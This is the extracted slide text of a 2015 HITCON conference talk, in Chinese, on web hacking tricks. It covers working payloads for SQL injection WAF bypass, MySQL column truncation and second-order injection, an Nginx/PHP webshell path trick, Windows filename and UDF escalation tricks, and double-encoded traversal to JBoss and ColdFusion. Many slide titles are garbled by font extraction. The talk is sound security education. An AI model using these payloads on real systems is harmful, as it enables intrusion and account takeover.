---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2015-08-hitcon-2015-community-web-hacking/
title: "HITCON 2015 Community 演講投影片 - 那些 Web Hacking 中的奇技淫巧 | Orange Tsai"
author: "Orange Tsai"
published: 2015-08-27T16:00:00.000Z
description: "噗，在 HITCON 2015 Community 的投影片，講一些好玩的特性跟技巧! https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2015-tricks-in-web-hacking.pdf"
---

* * *

噗，在 HITCON 2015 Community 的投影片，講一些好玩的特性跟技巧!

> [https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2015-tricks-in-web-hacking.pdf](https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2015-tricks-in-web-hacking.pdf)

那些 Web Hacking 中的奇技淫巧 - Speaker Deck

[![Avatar for Orange](https://secure.gravatar.com/avatar/5f7ab2ea341a883bf8572190738e864e?s=47)](https://speakerdeck.com/p8361)

[那些 Web Hacking 中的奇技淫巧](https://speakerdeck.com/p8361/na-xie-web-hacking-zhong-de-qi-ji-yin-qiao)

by [Orange](https://speakerdeck.com/p8361)

[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg)](https://speakerdeck.com/)

## Slide 1

### Slide 1 text

掄ⅼ9GD\*CEMKPIℎ䥥Ⱘ㕡䃌ト
QTCPIG"EJTQQVQTI



## Slide 2

### Slide 2 text

#DQWV/G
• 蔡政達 a.k.a Orange
• CHROOT 成員 / HITCON 成員 / DEVCORE 資安顧問
• 國內外研討會 HITCON, AVTokyo, WooYun 等講師
• 國內外駭客競賽 Capture the Flag 冠軍
• 揭露過 Microsoft, Django, Yahoo, Facebook, Google 等弱
點漏洞
• 專精於駭客⼿手法、Web Security 與網路滲透
#90後 #賽棍 #電競選⼿手 #滲透師 #Web狗 #



## Slide 3

### Slide 3 text

– 講 Web 可以講到你們聽不懂就贏了
聅⬕䇵巼㧤㧪㉩⯻粕ㇰ䮝



## Slide 4

### Slide 4 text

– 「⿊黑了你，從不是在你知道的那個點上」
ׅ箞㌈哨䇰㿿׆



## Slide 5

### Slide 5 text

– 擺在你眼前是 Feature、擺在駭客眼前就是漏洞
ׅ箞㌈哨䇰㿿׆



## Slide 6

### Slide 6 text

\- 別⼈人笑我太瘋癲，我笑他⼈人看不穿
ׅ㋾惐哨䇰㿿׆



## Slide 7

### Slide 7 text

\- 猥瑣「流」
ׅ㋾惐哨䇰㿿׆



## Slide 8

### Slide 8 text

No content


## Slide 9

### Slide 9 text

Q: 資料庫中的密碼破不出來怎麼辦？



## Slide 10

### Slide 10 text

ׅⓧ⽅哨䇰㿿׆



## Slide 11

### Slide 11 text

第三⽅方內
容安全
前端
安全
DNS
安全
Web應⽤用
安全
Web框架
安全
後端語⾔言
安全
Web伺服
器安全
資料庫
安全
作業系統
安全
XSS
XXE
SQL Injection
CSRF



## Slide 12

### Slide 12 text

第三⽅方內
容安全
前端
安全
DNS
安全
Web應⽤用
安全
Web框架
安全
後端語⾔言
安全
Web伺服
器安全
資料庫
安全
作業系統
安全
Struts2 OGNL RCE
Rails YAML RCE
PHP Memory UAF
XSS
UXSS
Padding Oracle
Padding Oracle
XXE
DNS Hijacking
SQL Injection
Length Extension Attack
ShellShock
HeartBleed
JSONP Hijacking
FastCGI RCE
NPRE RCE
OVERLAYFS Local Root
CSRF Bit-Flipping Attack



## Slide 13

### Slide 13 text

⃮㋶䰿⃡緈䥥⻮㔬苌⛋㋶彍⃡緈䥥楫⚬
第三⽅方內
容安全
前端
安全
DNS
安全
Web應⽤用
安全
Web框架
安全
後端語⾔言
安全
Web伺服
器安全
資料庫
安全
作業系統
安全
↛䥥瞗瓴



## Slide 14

### Slide 14 text

哪⋬



## Slide 15

### Slide 15 text

\- Perl 語⾔言特性導致網⾴頁應⽤用程式漏洞
Z



## Slide 16

### Slide 16 text

@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple',
'B' => 'Banana',
'C' => @list };
print Dumper($hash); # ?
$hash = { 'A' => 'Apple',
'B' => 'Banana',
'C' => 'Ba',
'Ba' => 'Banana' };
2GTN嵿峡箞㌈



## Slide 17

### Slide 17 text

@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple',
'B' => 'Banana',
'C' => @list };
print Dumper($hash); # wrong!
$hash = { 'A' => 'Apple',
'B' => 'Banana',
'C' => ('Ba', 'Ba', 'Banana') };
2GTN嵿峡箞㌈



## Slide 18

### Slide 18 text

@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple',
'B' => 'Banana',
'C' => @list };
print Dumper($hash); # correct!
$hash = { 'A' => 'Apple',
'B' => 'Banana',
'C' => 'Ba',
'Ba' => 'Banana' };
2GTN嵿峡箞㌈



## Slide 19

### Slide 19 text

$WIcreate(
{
login\_name => $login\_name,
realname => $cgi->param('realname'),
cryptpassword => $password
});



## Slide 20

### Slide 20 text

$WIcreate(
{
login\_name => $login\_name,
realname => $cgi->param('realname'),
cryptpassword => $password
});
\# index.cgi?
realname=xxx&realname=login\_name&realname=
admin



## Slide 21

### Slide 21 text

\- Windows 特性造成網⾴頁應⽤用限制繞過
Z



## Slide 22

### Slide 22 text

9KPFQYU箞㌈职㓱傓櫢㒪䠉椱┗
儿職
• Windows API 檔名正規化特性
\- shell.php # shel>.php # shell"php # shell.<
• Windows Tilde 短檔名特性
\- /backup/20150707\_002dfa0f3ac08429.zip
\- /backup/201507~1.zip
• Windows NTFS 特性
\- download.php::$data



## Slide 23

### Slide 23 text

– 講些⽐比較特別的應⽤用就好
揞勢㭸巼┑箊㙪Ⅷ



## Slide 24

### Slide 24 text

┊䠉06(5箞㌈儿職/\[53.\
RNWIKPAFKT椱┗\
• MySQL UDF 提權\
\- MySQL 5.1\
\- @@plugin\_dir\
\- Custom Dir -> System Dir -> Plugin Dir\
• 簡單說就是利⽤用 into outfile 建⽴立⺫⽬目錄\
\- INTO OUTFILE 'plugins::$index\_allocation'\
\- mkdir plugins\
\
\
\
## Slide 25\
\
### Slide 25 text\
\
– 對系統特性的不了解會導致「症狀解」\
ׅ箞㌈哨䇰㿿׆\
\
\
\
## Slide 26\
\
### Slide 26 text\
\
– 講三個較為有趣並被⼈人忽略的特性與技巧\
ׅ9GD\*CEMKPIℎ䥥Ⱘ㕡䃌ト׆\
\
\
\
## Slide 27\
\
### Slide 27 text\
\
㹄屰孉䰛ㇰ碍嬭箞㌈\
• 問題點\
\- 未正確的使⽤用正規表⽰示式導致⿊黑名單被繞過\
• 範例\
\- WAF 繞過\
\- 防禦繞過\
\
\
\
## Slide 28\
\
### Slide 28 text\
\
\- 中⽂文換⾏行編碼繞過網⾴頁應⽤用防⽕火牆規則\
㎦⭤⃡\
\
\
\
## Slide 29\
\
### Slide 29 text\
\
http://hackme.cc/view.aspx\
?sem=' UNION SELECT(user),null,null,null,\
&noc=,null,null,null,null,null/\*三\*/FROM\
dual--\
\
\
\
## Slide 30\
\
### Slide 30 text\
\
http://hackme.cc/view.aspx\
?sem=' UNION SELECT(user),null,null,null,\
&noc=,null,null,null,null,null/\*上\*/FROM\
dual--\
\
\
\
## Slide 31\
\
### Slide 31 text\
\
http://hackme.cc/view.aspx\
?sem=' UNION SELECT(user),null,null,null,\
&noc=,null,null,null,null,null/\*上\*/FROM\
dual-- %u4E0A\
%u4D0A\
...\
\
\
\
## Slide 32\
\
### Slide 32 text\
\
\- 繞過防禦限制繼續 Exploit\
㎦⭤Ⅽℬ⃡\
\
\
\
## Slide 33\
\
### Slide 33 text\
\
for($i=0; $i\
\
\
## Slide 34\
\
### Slide 34 text\
\
for($i=0; $i\
\
\
## Slide 35\
\
### Slide 35 text\
\
for($i=0; $i\
\
\
## Slide 36\
\
### Slide 36 text\
\
\- 繞過防禦限制繼續 Exploit\
㎦⭤ⅭℬⅭ\
\
\
\
## Slide 37\
\
### Slide 37 text\
\
\- 駭客透過 Nginx ⽂文件解析漏洞成功執⾏行 Webshell\
㎦⭤ⅭℬⅭ\
是 PHP 問題，某⽅方⾯面也不算問題(?)所也沒有 CVE\
PHP 後⾯面版本以 Security by Default 防⽌止此問題\
\
\
\
## Slide 38\
\
### Slide 38 text\
\
差不多是這種狀況\
http://hackme.cc/avatar.gif/foo.php\
\
\
\
## Slide 39\
\
### Slide 39 text\
\
; Patch from 80sec\
if ($fastcgi\_script\_name ~ ..\*/.\*php)\
{\
return 403;\
}\
㎦⭤ⅭℬⅭ\
http://www.80sec.com/nginx-securit.html\
\
\
\
## Slide 40\
\
### Slide 40 text\
\
It seems to work\
http://hackme.cc/avatar.gif/foo.php\
\
\
\
## Slide 41\
\
### Slide 41 text\
\
But ...\
http://hackme.cc/avatar.gif/%0Afoo.php\
\
\
\
## Slide 42\
\
### Slide 42 text\
\
NewLine\
security.limit\_extensions (>PHP 5.3.9)\
\*QYVQ2CVEJ!\
\
\
\
## Slide 43\
\
### Slide 43 text\
\
/\[53.紉䮝⩬㐬截碍箞㌈\
• 問題點\
\- 對資料不了解，設置了錯誤的語系、資料型態\
• 範例\
\- ⼆二次 SQL 注⼊入\
\- 字符截斷導致 ...\
\
\
\
## Slide 44\
\
### Slide 44 text\
\
\- 輸⼊入內容⼤大於指定形態⼤大⼩小之截斷\
㎦⭤⃡\
\
\
\
## Slide 45\
\
### Slide 45 text\
\
$name = $\_POST\['name'\];\
$r = query('SELECT \* FROM users WHERE name=?', $name);\
if (count($r) > 0){\
die('duplicated name');\
} else {\
query('INSERT INTO users VALUES(?, ?)', $name, $pass);\
die('registed');\
}\
// CREATE TABLE users(id INT, name VARCHAR(255), ...)\
\
\
\
## Slide 46\
\
### Slide 46 text\
\
mysql> CREATE TABLE users (\
-\> id INT,\
-\> name VARCHAR(255),\
-\> pass VARCHAR(255)\
-\> );\
Query OK, 0 rows affected (0.00 sec)\
mysql> INSERT INTO users VALUES(1, 'admin', 'pass');\
Query OK, 1 row affected (0.00 sec)\
mysql> INSERT INTO users VALUES(2, 'admin ... x', 'xxd');\
Query OK, 1 row affected, 1 warning (0.00 sec)\
mysql> SELECT \* FROM users WHERE name='admin';\
+------+------------------+------+\
\| id \| name \| pass \|\
+------+------------------+------+\
\| 1 \| admin \| pass \|\
\| 2 \| admin \| xxd \|\
+------+------------------+------+\
2 rows in set (0.00 sec)\
\
\
\
## Slide 47\
\
### Slide 47 text\
\
name: admin ... x\
\*QYVQ'ZRNQKV\
\[space\] x 250\
\
\
\
## Slide 48\
\
### Slide 48 text\
\
CVE-2009-2762 WordPress 2.6.1 Column Truncation Vulnerability\
\*QYVQ'ZRNQKV\
\
\
\
## Slide 49\
\
### Slide 49 text\
\
\- CREATE TABLE users (id INT, name TEXT, ...)\
⻰宽瓱6':6⩬㐬㋯熝抇獑\
\
\
\
## Slide 50\
\
### Slide 50 text\
\
CVE-2015-3440 WordPress 4.2.1 Truncation Vulnerability\
⻰宽瓱6':6⩬㐬㋯熝抇獑\
\
\
\
## Slide 51\
\
### Slide 51 text\
\
\- Unicode 編碼之截斷\
㎦⭤Ⅽ\
\
\
\
## Slide 52\
\
### Slide 52 text\
\
$name = $\_POST\['name'\];\
if (strlen($name) > 16)\
die('name too long');\
$r = query('SELECT \* FROM users WHERE name=?', $name);\
if (count($r) > 0){\
die('duplicated name');\
} else {\
query('INSERT INTO users VALUES(?, ?)', $name, $pass);\
die('registed');\
}\
// CREATE TABLE users(id INT, name VARCHAR(255), ...)\
DEFAULT CHARSET=utf8\
\
\
\
## Slide 53\
\
### Slide 53 text\
\
mysql> CREATE TABLE users (\
-\> id INT,\
-\> name VARCHAR(255),\
-\> pass VARCHAR(255)\
-\> ) DEFAULT CHARSET=utf8;\
Query OK, 0 rows affected (0.00 sec)\
mysql> INSERT INTO users VALUES(1, 'admin', 'pass');\
Query OK, 1 row affected (0.01 sec)\
mysql> INSERT INTO users VALUES(2, 'adminx', 'xxd');\
Query OK, 1 row affected, 1 warning (0.00 sec)\
mysql> SELECT \* FROM users WHERE name='admin';\
+------+-------+------+\
\| id \| name \| pass \|\
+------+-------+------+\
\| 1 \| admin \| pass \|\
\| 2 \| admin \| xxd \|\
+------+-------+------+\
2 rows in set (0.00 sec)\
\
\
\
## Slide 54\
\
### Slide 54 text\
\
name: adminx\
\*QYVQ'ZRNQKV\
\
\
\
\
## Slide 55\
\
### Slide 55 text\
\
CVE-2013-4338 WordPress < 3.6.1 Object Injection Vulnerability\
CVE-2015-3438 WordPress < 4.1.2 Cross-Site Scripting Vulnerability\
\*QYVQ'ZRNQKV\
\
\
\
## Slide 56\
\
### Slide 56 text\
\
\- 錯誤的資料庫欄位型態導致⼆二次 SQL 注⼊入\
⻰宽瓱\
\
\
\
## Slide 57\
\
### Slide 57 text\
\
#靠北⼯工程師 10418\
htp://j.mp/1KiuhRZ\
\
\
\
## Slide 58\
\
### Slide 58 text\
\
$uid = $\_GET\['uid'\];\
if ( is\_numeric($uid) )\
query("INSERT INTO blacklist VALUES($uid)");\
$uids = query("SELECT uid FROM blacklist");\
foreach ($uids as $uid) {\
show( query("SELECT log FROM logs WHERE uid=$uid") );\
}\
// CREATE TABLE blacklist(id TEXT, uid TEXT, ...)\
\
\
\
## Slide 59\
\
### Slide 59 text\
\
$uid = $\_GET\['uid'\];\
if ( is\_numeric($uid) )\
query("INSERT INTO blacklist VALUES($uid)");\
$uids = query("SELECT uid FROM blacklist");\
foreach ($uids as $uid) {\
show( query("SELECT log FROM logs WHERE uid=$uid") );\
}\
// uid=0x31206f7220313d31 # 1 or 1=1\
\
\
\
## Slide 60\
\
### Slide 60 text\
\
sql\_mode = strict\
utf8mb4\
\*QYVQ2CVEJ!\
\
\
\
## Slide 61\
\
### Slide 61 text\
\
9GD∛㧮⥉ⓧ⽅㪗㲬䇰㿿\
• 問題發⽣生情境\
\- 使⽤用多個網⾴頁伺服器相互處理 URL ( 如 ProxyPass,\
mod\_jk... )\
\
\
\
## Slide 62\
\
### Slide 62 text\
\
http://hackme.cc/jmx-console/\
\
\
\
## Slide 63\
\
### Slide 63 text\
\
http://hackme.cc/sub/.%252e/\
jmx-console/\
Deploy to GetShell\
\
\
\
## Slide 64\
\
### Slide 64 text\
\
• workers.properti\
es\
\- worker.ajp1.port=\
8009\
\- worker.ajp1.host=\
127.0.0.1\
\- worker.ajp1.type=\
ajp13\
• uriworkermap.pro\
perties\
\- /sub/\*=ajp1\
\- /sub=ajp1\
\
\
\
## Slide 65\
\
### Slide 65 text\
\
http://hackme.cc/sub/../jmx-console/\
Apache\
http://hackme.cc/sub/../jmx-console/\
not matching /sub/\*, return 404\
\
\
\
## Slide 66\
\
### Slide 66 text\
\
http://hackme.cc/sub/.%2e/jmx-console/\
Apache\
http://hackme.cc/sub/.%252e/jmx-console/\
http://hackme.cc:8080/sub/.%2e/jmx-console/\
JBoss\
http://hackme.cc:8080/sub/../jmx-console/\
mod\_jk\
\
\
\
## Slide 67\
\
### Slide 67 text\
\
• HITCON 2014 CTF\
\- 2 / 1020 解出\
• 舊版 ColdFusion 漏洞\
\- ColdFusion with Apache Connector\
\- 舊版本 ColdFusion Double Encoding 造成資訊洩漏\
漏洞\
\
\
\
## Slide 68\
\
### Slide 68 text\
\
http://hackme.cc/admin%252f\
%252ehtaccess%2500.cfm\
\
\
\
## Slide 69\
\
### Slide 69 text\
\
Apache\
http://hackme.cc/admin/.htaccess\
, return 403\
\
\
\
## Slide 70\
\
### Slide 70 text\
\
Apache\
http://hackme.cc/admin%252f.htaccess\
/admin%2f.htaccess not found, return 404\
http://hackme.cc/admin%2f.htaccess\
\
\
\
## Slide 71\
\
### Slide 71 text\
\
Apache\
http://hackme.cc/admin%252f.htaccess%2500.cfm\
End with .cfm, pass to ColdFusion\
http://hackme.cc/admin%2f.htaccess%00.cfm\
ColdFusion\
http://hackme.cc/admin/.htaccess .cfm\
http://hackme.cc/admin%2f.htaccess%00.cfm\
\
\
\
## Slide 72\
\
### Slide 72 text\
\
\*QYVQ2CVEJ!\
\
\
\
## Slide 73\
\
### Slide 73 text\
\
3#